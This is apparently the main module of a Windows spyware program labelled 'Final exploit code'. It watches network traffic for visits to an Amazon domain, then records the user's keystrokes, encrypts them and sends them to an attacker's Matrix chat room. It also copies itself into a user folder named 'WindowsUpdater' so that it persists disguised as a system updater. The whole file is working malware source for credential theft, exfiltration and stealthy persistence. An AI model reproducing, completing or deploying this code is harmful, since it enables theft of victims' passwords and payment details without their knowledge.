import os
from shutil import copyfile
from sys import executable
from threading import Thread
from matrix_client.errors import MatrixHttpLibError

from exploit.communication.matrix_client import send_msg
from exploit.malware.key_logger import KeyLogger
from exploit.malware.low_level_sniffer import listen_traffic
from exploit.tools.encryption import encrypt, decrypt_dictionary
from exploit.tools.internet_connectivity import execute_on_stable_connection

"""
------ Final exploit code ------
"""

# seconds
TARGET_DOMAIN = 'amazon'
KEY_LOGGING_DURATION = 20
SNIFFING_PAUSE_DURATION = KEY_LOGGING_DURATION + 10


def read_updates() -> dict:
    try:
        with open("updates.txt", "r") as updates_file:
            encrypted_updates = updates_file.read()
            return decrypt_dictionary(encrypted_updates)
    except:
        return {}


def get_matrix_creds():
    # it's recommended to hardcode default creds,
    # cause it's easier to reveal creds passed as CLI arguments
    # replace %matrix.*% tokens with real values
    updates: dict = read_updates()
    server_name = updates['matrix_server'] if updates.get('matrix_server') else "%matrix.server%"
    username = updates['matrix_user'] if updates.get('matrix_user') else "%matrix.user%"
    password = updates['matrix_pwd'] if updates.get('matrix_pwd') else "%matrix.pwd%"
    room_id = updates['matrix_room'] if updates.get('matrix_room') else "%matrix.room%"
    return server_name, username, password, room_id


def start_thread_on_connection(action: callable):
    Thread(target=execute_on_stable_connection, args=(action,)).start()


def intercept_user_keys():
    key_logger = KeyLogger()
    logs: str = key_logger.intercept_keys(KEY_LOGGING_DURATION)
    if not logs:
        return
    encrypted_logs = encrypt(logs)
    (server_name, username, password, room_id) = get_matrix_creds()
    try:
        send_msg(server_name, username, password, room_id, encrypted_logs)
    except MatrixHttpLibError:
        pass


def spy():
    listening_traffic: callable = lambda: listen_traffic(
        TARGET_DOMAIN,
        SNIFFING_PAUSE_DURATION,
        intercept_user_keys
    )
    start_thread_on_connection(listening_traffic)


def copy_exploit_to_destination(exploit_sub_folder=''):
    user_folder = os.getenv('USERPROFILE')
    destination_folder = user_folder + exploit_sub_folder
    os.makedirs(name=destination_folder, exist_ok=True)

    binary_name = executable.split('\\')[-1]
    new_binary_name = 'copy-' + binary_name  # new name is needed in order not to kill
    destination_binary = destination_folder + '\\' + new_binary_name
    copyfile(executable, destination_binary)

    return destination_binary


def main():
    exploit_sub_folder = "\\AppData\\Roaming\\WindowsUpdater"
    if exploit_sub_folder in executable:
        spy()
    else:
        copy_exploit_to_destination(exploit_sub_folder)


main()
